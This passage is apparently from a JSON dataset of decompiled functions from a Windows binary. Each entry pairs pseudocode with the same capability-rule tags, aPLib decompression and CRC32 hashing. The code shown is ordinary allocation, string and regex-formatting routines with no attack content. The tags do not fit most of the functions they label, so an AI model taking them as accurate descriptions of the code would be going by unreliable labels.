uStack232) break;\n        piVar5 = &var_59h + 1;\n        if (iVar7 != iVar1) {\n            piVar5 = auStack168._0_8_;\n        }\n        piVar6 = &var_59h + 1;\n        if (iVar7 != iVar1) {\n            piVar6 = auStack168._0_8_;\n        }\n        if (*piVar5 != piVar6[1]) {\n            uVar9 = 0x100;\n        }\n        uVar3 = 0x2000;\n        if (*piVar5 != piVar6[1]) {\n            uVar3 = 0;\n        }\n        uStack248 = uStack248 & 0xffffffff00000000 | uVar3 | uVar9;\n        uStack240 = arg3;\n        cVar2 = fcn.180015f40(arg3, uStack232, auStack184, uStack224);\n    }\n    uVar9 = (arg4 - arg3) + 1 >> 1;\n    if (arg4 < arg3) {\n        uVar9 = uVar11;\n    }\n    if (uVar9 != 0) {\n        do {\n            fcn.18000d6f0(arg2);\n            uVar11 = uVar11 + 1;\n        } while (uVar11 != uVar9);\n    }\n    *puStack216 = arg2;\n    fcn.1800159b0(auStack168);\n    fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack280);\n    return;\n}\n",
        "token_count": 1435
    },
    "1800173f": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong * fcn.1800173f0(ulong *arg1, int64_t arg2, ulong arg3, uint16_t *arg4)\n\n{\n    uint16_t uVar1;\n    uchar (*pauVar2) [16];\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint16_t *puVar9;\n    uint16_t *in_stack_00000028;\n    \n    if (arg4 == in_stack_00000028) {\n        *arg1 = arg3;\n        return arg1;\n    }\n    do {\n        uVar8 = 0;\n        puVar9 = arg4 + 1;\n        if (*arg4 == 0x26) {\n            pauVar2 = *(arg2 + 0x10);\n            iVar6 = *(arg2 + 0x18) - pauVar2;\n            iVar3 = iVar6 >> 0x3f;\n            if (iVar6 / 0x18 + iVar3 != iVar3) {\n                uVar4 = SUB168(*pauVar2 >> 0x40, 0);\n                uVar7 = (uVar4 - **pauVar2) + 1 >> 1;\n                if (uVar4 < **pauVar2) {\n                    uVar7 = uVar8;\n                }\n                if (uVar7 != 0) {\n                    do {\n                        fcn.18000d6f0(arg3);\n                        uVar8 = uVar8 + 1;\n                    } while (uVar8 != uVar7);\n                }\n            }\n        }\n        else {\n            if (*arg4 == 0x5c) {\n                if (puVar9 == in_stack_00000028) break;\n                uVar1 = *puVar9;\n                puVar9 = arg4 + 2;\n                if (uVar1 - 0x30 < 10) {\n                    iVar3 = *(arg2 + 0x10);\n                    uVar7 = uVar1 - 0x30;\n                    if (uVar7 < (*(arg2 + 0x18) - iVar3) / 0x18) {\n                        uVar4 = *(iVar3 + uVar7 * 0x18);\n                        uVar5 = SUB168(*(iVar3 + uVar7 * 0x18) >> 0x40, 0);\n                        uVar7 = (uVar5 - uVar4) + 1 >> 1;\n                        if (uVar5 < uVar4) {\n                            uVar7 = uVar8;\n                        }\n                        if (uVar7 != 0) {\n                            do {\n                                fcn.18000d6f0(arg3);\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 != uVar7);\n                        }\n                    }\n                    goto code_r0x00018001756e;\n                }\n            }\n            fcn.18000d6f0(arg3);\n        }\ncode_r0x00018001756e:\n        arg4 = puVar9;\n    } while (puVar9 != in_stack_00000028);\n    *arg1 = arg3;\n    return arg1;\n}\n",
        "token_count": 721
    },
    "1800175c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong * fcn.1800175c0(ulong *arg1, int64_t arg2, ulong arg3, uint16_t *arg4)\n\n{\n    uint16_t uVar1;\n    uchar (*pauVar2) [16];\n    int64_t iVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint16_t *puVar10;\n    uint64_t uVar11;\n    uint16_t *in_stack_00000028;\n    \n    if (arg4 == in_stack_00000028) {\n        *arg1 = arg3;\n        return arg1;\n    }\n    uVar11 = 0;\n    do {\n        puVar10 = arg4 + 1;\n        if ((*arg4 != 0x24) || (puVar10 == in_stack_00000028)) goto code_r0x00018001784f;\n        uVar1 = *puVar10;\n        if (uVar1 == 0x24) {\n            fcn.18000d6f0(arg3);\n            puVar10 = arg4 + 2;\n        }\n        else if (uVar1 == 0x60) {\n            uVar9 = *(arg2 + 0x28);\n            uVar5 = (*(arg2 + 0x30) - uVar9) + 1 >> 1;\n            if (*(arg2 + 0x30) <= uVar9 && uVar9 != *(arg2 + 0x30)) {\n                uVar5 = uVar11;\n            }\n            uVar9 = uVar11;\n            if (uVar5 == 0) {\ncode_r0x0001800176d7:\n                puVar10 = arg4 + 2;\n            }\n            else {\n                do {\n                    fcn.18000d6f0(arg3);\n                    uVar9 = uVar9 + 1;\n                } while (uVar9 != uVar5);\n                puVar10 = arg4 + 2;\n            }\n        }\n        else {\n            if (uVar1 == 0x27) {\n                uVar9 = *(arg2 + 0x40);\n                uVar5 = (*(arg2 + 0x48) - uVar9) + 1 >> 1;\n                if (*(arg2 + 0x48) <= uVar9 && uVar9 != *(arg2 + 0x48)) {\n                    uVar5 = uVar11;\n                }\n                uVar9 = uVar11;\n                if (uVar5 != 0) {\n                    do {\n                        fcn.18000d6f0(arg3);\n                        uVar9 = uVar9 + 1;\n                    } while (uVar9 != uVar5);\n                }\n                goto code_r0x0001800176d7;\n            }\n            puVar10 = arg4 + 2;\n            if (uVar1 == 0x26) {\n                pauVar2 = *(arg2 + 0x10);\n                iVar7 = *(arg2 + 0x18) - pauVar2;\n                iVar3 = iVar7 >> 0x3f;\n                if (iVar7 / 0x18 + iVar3 != iVar3) {\n                    uVar5 = SUB168(*pauVar2 >> 0x40, 0);\n                    uVar9 = (uVar5 - **pauVar2) + 1 >> 1;\n                    if (uVar5 < **pauVar2) {\n                        uVar9 = uVar11;\n                    }\n                    uVar5 = uVar11;\n                    if (uVar9 != 0) {\n                        do {\n                            fcn.18000d6f0(arg3);\n                            uVar5 = uVar5 + 1;\n                        } while (uVar5 != uVar9);\n                    }\n                }\n            }\n            else if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n                if ((puVar10 == in_stack_00000028) || (uVar1 = *puVar10,  9 < uVar1 - 0x30)) {\n                    bVar4 = false;\n                }\n                else {\n                    bVar4 = true;\n                    puVar10 = arg4 + 3;\n                    uVar8 = uVar1 + (uVar8 * 5 + -0x18) * 2;\n                }\n                if (uVar8 == 0) {\n                    fcn.18000d6f0(arg3);\n                    fcn.18000d6f0(arg3);\n                    if (bVar4) goto code_r0x00018001784f;\n                }\n                else {\n                    iVar3 = *(arg2 + 0x10);\n                    uVar9 = uVar8;\n                    if (uVar9 < (*(arg2 + 0x18) - iVar3) / 0x18) {\n                        uVar5 = *(iVar3 + uVar9 * 0x18);\n                        uVar6 = SUB168(*(iVar3 + uVar9 * 0x18) >> 0x40, 0);\n                        uVar9 = (uVar6 - uVar5) + 1 >> 1;\n                        if (uVar6 < uVar5) {\n                            uVar9 = uVar11;\n                        }\n                        uVar5 = uVar11;\n                        if (uVar9 != 0) {\n                            do {\n                                fcn.18000d6f0(arg3);\n                                uVar5 = uVar5 + 1;\n                            } while (uVar5 != uVar9);\n                        }\n                    }\n                }\n            }\n            else {\n                fcn.18000d6f0(arg3);\ncode_r0x00018001784f:\n                fcn.18000d6f0(arg3);\n            }\n        }\n        arg4 = puVar10;\n        if (puVar10 == in_stack_00000028) {\n            *arg1 = arg3;\n            return arg1;\n        }\n    } while( true );\n}\n",
        "token_count": 1348
    },
    "180019c3": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180019c30(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t arg1_00;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    if (0xfffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar3 = arg1[2] - *arg1 >> 4;\n    iVar6 = arg1[1] - *arg1 >> 4;\n    uVar5 = arg2;\n    if ((uVar3 <= 0xfffffffffffffff - (uVar3 >> 1)) && (uVar5 = (uVar3 >> 1) + uVar3,  uVar5 < arg2)) {\n        uVar5 = arg2;\n    }\n    uVar3 = uVar5 * 0x10;\n    if (uVar5 < 0x1000000000000000) {\n        uVar5 = uVar3;\n        if (0xfff < uVar3) goto code_r0x000180019cba;\n        if (uVar3 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar3);\n        }\n    }\n    else {\n        uVar5 = 0xffffffffffffffff;\ncode_r0x000180019cba:\n        uVar4 = uVar5 + 0x27;\n        if (uVar4 <= uVar5) {\n            uVar4 = 0xffffffffffffffff;\n        }\n        iVar2 = fcn.18008fb2c(uVar4);\n        if (iVar2 == 0) goto code_r0x000180019d8f;\n        uVar5 = iVar2 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar2;\n    }\n    iVar2 = arg2 - iVar6;\n    if (iVar2 != 0) {\n        fcn.1800ae290(iVar6 * 0x10 + uVar5, 0, iVar2 * 0x10);\n    }\n    fcn.1800ade80(uVar5, *arg1, arg1[1] - *arg1);\n    uVar4 = *arg1;\n    if (uVar4 != 0) {\n        arg1_00 = uVar4;\n        if ((0xfff < (arg1[2] - uVar4 & 0xfffffffffffffff0)) && (arg1_00 = *(uVar4 - 8),  0x1f < (uVar4 - arg1_00) - 8))\n        {\ncode_r0x000180019d8f:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg1 = uVar5;\n    arg1[1] = arg2 * 0x10 + uVar5;\n    arg1[2] = uVar3 + uVar5;\n    return;\n}\n",
        "token_count": 733
    },
    "180019e4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong * fcn.180019e40(ulong *arg1, ulong *arg2)\n\n{\n    int64_t *piVar1;\n    int64_t arg2_00;\n    code *pcVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t arg1_00;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t arg2_01;\n    int64_t arg3;\n    \n    *arg1 = *arg2;\n    fcn.180019f70(arg1 + 1, arg2 + 1);\n    piVar1 = arg1 + 5;\n    if (piVar1 != arg2 + 5) {\n        arg2_00 = arg2[5];\n        iVar3 = *piVar1;\n        arg3 = arg2[6] - arg2_00;\n        uVar6 = arg3 >> 4;\n        uVar5 = arg1[7] - iVar3 >> 4;\n        if (uVar5 < uVar6) {\n            if (0xfffffffffffffff < uVar6) {\n                fcn.180014900();\n                pcVar2 = swi(3);\n                puVar4 = (*pcVar2)();\n                return puVar4;\n            }\n            arg2_01 = uVar6;\n            if ((uVar5 <= 0xfffffffffffffff - (uVar5 >> 1)) && (arg2_01 = (uVar5 >> 1) + uVar5,  arg2_01 < uVar6)) {\n                arg2_01 = uVar6;\n            }\n            arg1_00 = iVar3;\n            if (iVar3 != 0) {\n                if (0xfff < uVar5 * 0x10) {\n                    arg1_00 = *(iVar3 + -8);\n                    if (0x1f < (iVar3 - arg1_00) - 8U) {\n                        fcn.1800b3528(iVar3 - arg1_00, uVar5 * 0x10 + 0x27);\n                        pcVar2 = swi(3);\n                        puVar4 = (*pcVar2)();\n                        return puVar4;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n                *piVar1 = 0;\n                arg1[6] = 0;\n                arg1[7] = 0;\n            }\n            iVar3 = fcn.18001b980(arg1_00, arg2_01);\n            *piVar1 = iVar3;\n            arg1[6] = iVar3;\n            arg1[7] = arg2_01 * 0x10 + iVar3;\n        }\n        iVar3 = *piVar1;\n        fcn.1800ade80(iVar3, arg2_00, arg3);\n        arg1[6] = arg3 + iVar3;\n    }\n    return arg1;\n}\n",
        "token_count": 642
    },
    "180019f7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.180019f70(uint64_t *arg1, uint64_t *arg2)\n\n{\n    uint64_t arg2_00;\n    code *pcVar1;\n    uint64_t uVar2;\n    uint64_t *puVar3;\n    uint64_t arg1_00;\n    uint64_t uVar4;\n    uint64_t arg2_01;\n    int64_t arg3;\n    \n    if (arg1 != arg2) {\n        uVar2 = *arg1;\n        arg2_00 = *arg2;\n        arg3 = arg2[1] - arg2_00;\n        arg1_00 = arg1[2] - uVar2 >> 2;\n        uVar4 = arg3 >> 2;\n        if (arg1_00 < uVar4) {\n            if (0x3fffffffffffffff < uVar4) {\n                fcn.180014900();\n                pcVar1 = swi(3);\n                puVar3 = (*pcVar1)();\n                return puVar3;\n            }\n            arg2_01 = uVar4;\n            if ((arg1_00 <= 0x3fffffffffffffff - (arg1_00 >> 1)) &&\n               (arg2_01 = (arg1_00 >> 1) + arg1_00,  arg2_01 < uVar4)) {\n                arg2_01 = uVar4;\n            }\n            if (uVar2 != 0) {\n                uVar4 = arg1_00 * 4;\n                arg1_00 = uVar2;\n                if (0xfff < uVar4) {\n                    arg1_00 = *(uVar2 - 8);\n                    if (0x1f < (uVar2 - arg1_00) - 8) {\n                        fcn.1800b3528(arg1_00, uVar4 + 0x27);\n                        pcVar1 = swi(3);\n                        puVar3 = (*pcVar1)();\n                        return puVar3;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n                *arg1 = 0;\n                arg1[1] = 0;\n                arg1[2] = 0;\n            }\n            uVar2 = fcn.180015a30(arg1_00, arg2_01);\n            *arg1 = uVar2;\n            arg1[1] = uVar2;\n            arg1[2] = uVar2 + arg2_01 * 4;\n        }\n        uVar2 = *arg1;\n        fcn.1800ade80(uVar2, arg2_00, arg3);\n        arg1[1] = arg3 + uVar2;\n        arg1[3] = arg2[3];\n    }\n    return arg1;\n}\n",
        "token_count": 615
    },
    "18001b4e": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.18001b4e0(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    if (0xfffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar2 = arg1[2] - *arg1 >> 4;\n    iVar4 = arg1[1] - *arg1 >> 4;\n    arg2_00 = arg2;\n    if ((uVar2 <= 0xfffffffffffffff - (uVar2 >> 1)) && (arg2_00 = (uVar2 >> 1) + uVar2,  arg2_00 < arg2)) {\n        arg2_00 = arg2;\n    }\n    arg1_00 = fcn.18001b980(uVar2, arg2_00);\n    iVar3 = arg2 - iVar4;\n    if (iVar3 != 0) {\n        fcn.1800ae290(iVar4 * 0x10 + arg1_00, 0, iVar3 * 0x10);\n    }\n    fcn.1800ade80(arg1_00, *arg1, arg1[1] - *arg1);\n    iVar4 = *arg1;\n    if (iVar4 != 0) {\n        uVar2 = arg1[2] - iVar4 & 0xfffffffffffffff0;\n        iVar3 = iVar4;\n        if (0xfff < uVar2) {\n            iVar3 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar3) - 8U) {\n                fcn.1800b3528(iVar4 - iVar3, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg1_00;\n    arg1[1] = arg2 * 0x10 + arg1_00;\n    arg1[2] = arg2_00 * 0x10 + arg1_00;\n    return;\n}\n",
        "token_count": 528
    },
    "18001b60": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.18001b600(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong *puVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint *puVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int64_t iVar13;\n    uint *puVar14;\n    ulong var_1h;\n    \n    if (0xaaaaaaaaaaaaaaa < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar13 = (arg1[1] - *arg1) / 6 + (arg1[1] - *arg1 >> 0x3f);\n    iVar13 = (iVar13 >> 2) - (iVar13 >> 0x3f);\n    uVar10 = (arg1[2] - *arg1) / 0x18;\n    uVar9 = arg2;\n    if ((uVar10 <= 0xaaaaaaaaaaaaaaa - (uVar10 >> 1)) && (uVar9 = (uVar10 >> 1) + uVar10,  uVar9 < arg2)) {\n        uVar9 = arg2;\n    }\n    puVar14 = NULL;\n    uVar10 = uVar9 * 0x18;\n    uVar6 = 0xffffffffffffffff;\n    if ((uVar9 < 0xaaaaaaaaaaaaaab) && (uVar6 = uVar10,  uVar10 < 0x1000)) {\n        if (uVar10 != 0) {\n            puVar14 = fcn.18008fb2c(uVar10);\n        }\n    }\n    else {\n        uVar10 = uVar6 + 0x27;\n        if (uVar6 + 0x27 <= uVar6) {\n            uVar10 = 0xffffffffffffffff;\n        }\n        iVar7 = fcn.18008fb2c(uVar10);\n        if (iVar7 == 0) goto code_r0x00018001b7ec;\n        puVar14 = iVar7 + 0x27U & 0xffffffffffffffe0;\n        *(puVar14 + -2) = iVar7;\n    }\n    puVar5 = puVar14 + iVar13 * 6;\n    for (iVar13 = arg2 - iVar13; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar5 = 0;\n        puVar5[1] = 0;\n        *(puVar5 + 2) = 0;\n        puVar5 = puVar5 + 3;\n    }\n    puVar11 = *arg1;\n    puVar12 = arg1[1];\n    puVar8 = puVar14;\n    if (puVar11 != puVar12) {\n        do {\n            uVar2 = puVar11[1];\n            uVar3 = puVar11[2];\n            uVar4 = puVar11[3];\n            *puVar8 = *puVar11;\n            puVar8[1] = uVar2;\n            puVar8[2] = uVar3;\n            puVar8[3] = uVar4;\n            puVar5 = puVar11 + 4;\n            puVar11 = puVar11 + 6;\n            *(puVar8 + 4) = *puVar5;\n            puVar8 = puVar8 + 6;\n        } while (puVar11 != puVar12);\n        puVar11 = *arg1;\n    }\n    if (puVar11 != NULL) {\n        puVar12 = puVar11;\n        if ((0xfff < ((arg1[2] - puVar11) / 0x18) * 0x18) &&\n           (puVar12 = *(puVar11 + -2),  0x1f < puVar11 + (-8 - puVar12))) {\ncode_r0x00018001b7ec:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(puVar12);\n    }\n    *arg1 = puVar14;\n    arg1[1] = puVar14 + arg2 * 6;\n    arg1[2] = puVar14 + uVar9 * 6;\n    return;\n}\n",
        "token_count": 1011
    },
    "18002091": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.180020910(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    ulong in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar8 = arg1[2];\n    if (0x7fffffffffffffff - uVar8 < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 + uVar8 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x000180020a6e;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2 + uVar8;\n    arg1[3] = uVar7;\n    if (uVar1 < 0x10) {\n        fcn.1800ade80(uVar5, in_stack_00000028, in_stack_00000030);\n        fcn.1800ade80(uVar5 + in_stack_00000030, arg1, uVar8 + 1);\n    }\n    else {\n        uVar7 = *arg1;\n        fcn.1800ade80(uVar5, in_stack_00000028, in_stack_00000030);\n        fcn.1800ade80(uVar5 + in_stack_00000030, uVar7, uVar8 + 1);\n        uVar8 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar8 = *(uVar7 - 8),  0x1f < (uVar7 - uVar8) - 8)) {\ncode_r0x000180020a6e:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar8);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 807
    },
    "18002eb7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t fcn.18002eb70(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t arg4;\n    int64_t arg1_00;\n    \n    iVar4 = *arg1;\n    iVar6 = (arg2 - iVar4) + SUB168(SEXT816(-0x7777777777777777) * SEXT816(arg2 - iVar4) >> 0x40, 0);\n    iVar3 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(arg1[1] - iVar4) >> 0x40, 0) + (arg1[1] - iVar4);\n    iVar3 = (iVar3 >> 7) - (iVar3 >> 0x3f);\n    if (iVar3 == 0x111111111111111) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        iVar6 = (*pcVar1)();\n        return iVar6;\n    }\n    uVar2 = iVar3 + 1;\n    iVar4 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(arg1[2] - iVar4) >> 0x40, 0) + (arg1[2] - iVar4);\n    uVar5 = (iVar4 >> 7) - (iVar4 >> 0x3f);\n    arg4 = uVar2;\n    if ((uVar5 <= 0x111111111111111 - (uVar5 >> 1)) && (arg4 = (uVar5 >> 1) + uVar5,  arg4 < uVar2)) {\n        arg4 = uVar2;\n    }\n    uVar2 = arg4 * 0xf0;\n    if (arg4 < 0x111111111111112) {\n        if (uVar2 < 0x1000) {\n            if (uVar2 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.18008fb2c(uVar2);\n            }\n            goto code_r0x00018002eca3;\n        }\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n    }\n    uVar5 = uVar2 + 0x27;\n    if (uVar5 <= uVar2) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    iVar4 = fcn.18008fb2c(uVar5);\n    if (iVar4 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        iVar6 = (*pcVar1)();\n        return iVar6;\n    }\n    uVar2 = iVar4 + 0x27U & 0xffffffffffffffe0;\n    *(uVar2 - 8) = iVar4;\ncode_r0x00018002eca3:\n    arg1_00 = ((iVar6 >> 7) - (iVar6 >> 0x3f)) * 0xf0 + uVar2;\n    fcn.180024ec0(arg1_00, arg3);\n    iVar4 = arg1[1];\n    iVar6 = *arg1;\n    uVar5 = uVar2;\n    if (arg2 == iVar4) {\n        for (; iVar6 != iVar4; iVar6 = iVar6 + 0xf0) {\n            fcn.180025590(uVar5, iVar6);\n            uVar5 = uVar5 + 0xf0;\n        }\n    }\n    else {\n        if (iVar6 != arg2) {\n            do {\n                fcn.180025590(uVar5, iVar6);\n                iVar6 = iVar6 + 0xf0;\n                uVar5 = uVar5 + 0xf0;\n            } while (iVar6 != arg2);\n            iVar4 = arg1[1];\n        }\n        if (arg2 != iVar4) {\n            iVar6 = arg1_00 - arg2;\n            do {\n                fcn.180025590(iVar6 + 0xf0 + arg2, arg2);\n                arg2 = arg2 + 0xf0;\n            } while (arg2 != iVar4);\n        }\n    }\n    fcn.18002f5f0(arg1, uVar2, iVar3 + 1, arg4);\n    return arg1_00;\n}\n",
        "token_count": 1007
    },
    "18002edd": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t fcn.18002edd0(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t arg2_00;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t arg1_00;\n    uint64_t arg2_01;\n    \n    iVar5 = *arg1;\n    iVar4 = (arg1[1] - iVar5) / 0xa0;\n    if (iVar4 == 0x199999999999999) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        iVar5 = (*pcVar2)();\n        return iVar5;\n    }\n    uVar1 = iVar4 + 1;\n    uVar3 = (arg1[2] - iVar5) / 0xa0;\n    arg2_01 = uVar1;\n    if ((uVar3 <= 0x199999999999999 - (uVar3 >> 1)) && (arg2_01 = (uVar3 >> 1) + uVar3,  arg2_01 < uVar1)) {\n        arg2_01 = uVar1;\n    }\n    arg2_00 = fcn.18002e1e0(arg1[2] - iVar5, arg2_01);\n    arg1_00 = ((arg2 - iVar5) / 0xa0) * 0xa0 + arg2_00;\n    fcn.18000da90(arg1_00, arg3);\n    fcn.18000da90(arg1_00 + 0x20, arg3 + 0x20);\n    fcn.18000da90(arg1_00 + 0x40, arg3 + 0x40);\n    fcn.18000da90(arg1_00 + 0x60, arg3 + 0x60);\n    fcn.18000da90(arg1_00 + 0x80, arg3 + 0x80);\n    iVar5 = arg1[1];\n    iVar7 = *arg1;\n    if (arg2 == iVar5) {\n        iVar6 = arg2_00;\n        if (iVar7 != iVar5) {\n            do {\n                fcn.1800254a0(iVar6, iVar7);\n                iVar6 = iVar6 + 0xa0;\n                iVar7 = iVar7 + 0xa0;\n            } while (iVar7 != iVar5);\n        }\n    }\n    else {\n        iVar6 = arg2_00;\n        if (iVar7 != arg2) {\n            do {\n                fcn.1800254a0(iVar6, iVar7);\n                iVar6 = iVar6 + 0xa0;\n                iVar7 = iVar7 + 0xa0;\n            } while (iVar7 != arg2);\n            iVar5 = arg1[1];\n        }\n        if (arg2 != iVar5) {\n            iVar7 = (arg1_00 + 0xa0) - arg2;\n            do {\n                fcn.1800254a0(iVar7 + arg2, arg2);\n                arg2 = arg2 + 0xa0;\n            } while (arg2 != iVar5);\n        }\n    }\n    fcn.18002f770(arg1, arg2_00, iVar4 + 1, arg2_01);\n    return arg1_00;\n}\n",
        "token_count": 777
    },
    "18002f2f": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.18002f2f0(uint64_t *arg1, uint64_t arg2, ulong noname_2, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    char in_stack_00000028;\n    \n    uVar8 = arg1[2];\n    if (0x7fffffffffffffff - uVar8 < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 + uVar8 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = 